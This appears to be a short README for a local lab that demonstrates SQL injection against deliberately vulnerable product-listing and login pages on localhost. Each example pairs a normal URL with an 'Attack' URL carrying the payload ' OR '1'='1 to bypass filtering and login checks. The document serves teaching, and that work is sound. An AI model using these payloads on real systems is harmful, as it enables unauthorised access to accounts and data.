# Start

Start the network with `./start_linux_network.sh`. You have to wait a bit until the databases are populated.

## Overview

To get an overview of the examples goto http://127.0.0.1:8781/

# Listing Example

## Standard query

http://127.0.0.1:8781/list_products/products_page.php?value=100

## Attack

http://127.0.0.1:8781/list_products/products_page.php?value=100' OR '1'='1

# Login Example

## Standard

http://127.0.0.1:8781/login/login.php

Enter 'admin', 'admin'

## Attack

http://127.0.0.1:8781/login/login.php?user=admin&password=xyz' OR '1'='1
